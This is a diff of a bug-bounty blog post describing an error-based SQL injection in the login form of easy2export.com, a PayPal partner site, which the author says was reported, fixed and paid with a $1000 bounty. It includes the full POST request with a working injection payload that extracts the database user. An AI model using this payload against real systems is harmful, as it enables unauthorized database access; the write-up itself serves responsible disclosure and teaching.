@@ -12,7 +12,8 @@ description: "error based sql injection in easy2export.com"
 </p>
 
 <br>
-At first, i tried to break the login form. After a few minutes of testing, I foundout that the login form is vulnerable to POST SQL Injection.
+At first try, I tried to test their login form. Luckily after a few minutes of testing, I found a critical POST SQL Injection!
+
 
 ```
 http://easy2export.com/index.php/site/login
@@ -22,24 +23,18 @@ Host: easy2export.com
 …
 LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&LoginForm[password]=’&LoginForm[accounttype]=sub&LoginForm[rememberMe]=0&yt0=
 ```
+
+The code below shows the final request plus the SQL Query `’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+` which I'm trying to get the database user which was shown in the picture below.
+
 <br>
 <p align="center">
 <img src="/assets/images/easy2export-sql-injection1.png">
 </p>
 <br>
-I immediately reported this to PayPal and they fixed the vulnerability issue quickly. **[10/30/2014 09:21:53]**
-<br>
-<p align="center">
-<img src="/assets/images/inhale-m.jpg">
-</p>
-<br>
-In their bug bounty program guidelines, it is noted that sql injection in paypal partner sites will receive 1000$.
-.
-.
-And they checked the eligibility of my report so they then send me the reward amounting to 1000$. **[11/22/14 6:23:35]**
+I reported the said vulnerability to PayPal and they fixed it immediately.
+I was awarded with a 1000$ bounty for this and It took a month for them to send the bounty.**
 <p align="center">
 <img src="/assets/images/paypal-bounty.png">
 </p>
 
 Thanks for reading! stay tuned for more blog posts.
-
